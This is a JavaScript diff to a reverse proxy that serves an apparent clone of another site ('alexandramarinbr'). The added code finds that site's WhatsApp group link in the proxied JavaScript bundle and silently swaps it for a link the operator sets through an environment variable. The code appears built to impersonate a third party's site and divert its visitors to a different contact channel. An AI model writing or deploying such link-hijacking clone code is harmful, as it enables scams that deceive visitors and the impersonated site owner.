@@ -30,6 +30,13 @@ const origenParaHost = (host) => {
   return ORIGENES[h] || TARGET;
 };
 
+// --- Reemplazo del enlace de WhatsApp en el bundle de alexandramarinbr -------
+// El enlace viene "horneado" en el JS de la SPA. Si defines WHATSAPP_BR, el
+// proxy reemplaza el enlace original por el tuyo al servir el JS (configurable
+// desde Render sin recompilar el clon).
+const WA_ORIGINAL_BR = "https://chat.whatsapp.com/JwSKJ2ZmaDmDm66iBkVtpS";
+const WHATSAPP_BR = process.env.WHATSAPP_BR || "";
+
 // Latencia artificial (ms) en la carga de la pagina (lado servidor).
 const SERVER_DELAY_MS = Number(process.env.SERVER_DELAY_MS || 0);
 
@@ -169,6 +176,13 @@ app.use(
       proxyRes: responseInterceptor(
         async (responseBuffer, proxyRes, req, _res) => {
           const contentType = proxyRes.headers["content-type"] || "";
+          // Cambiar el enlace de WhatsApp dentro del bundle JS (si esta activo).
+          if (contentType.includes("javascript") && WHATSAPP_BR) {
+            const js = responseBuffer.toString("utf8");
+            return js.includes(WA_ORIGINAL_BR)
+              ? js.split(WA_ORIGINAL_BR).join(WHATSAPP_BR)
+              : responseBuffer;
+          }
           if (!contentType.includes("text/html")) return responseBuffer;
           if (!soloEnInicio(req)) return responseBuffer; // otras paginas: sin cambios
           let html = responseBuffer.toString("utf8");
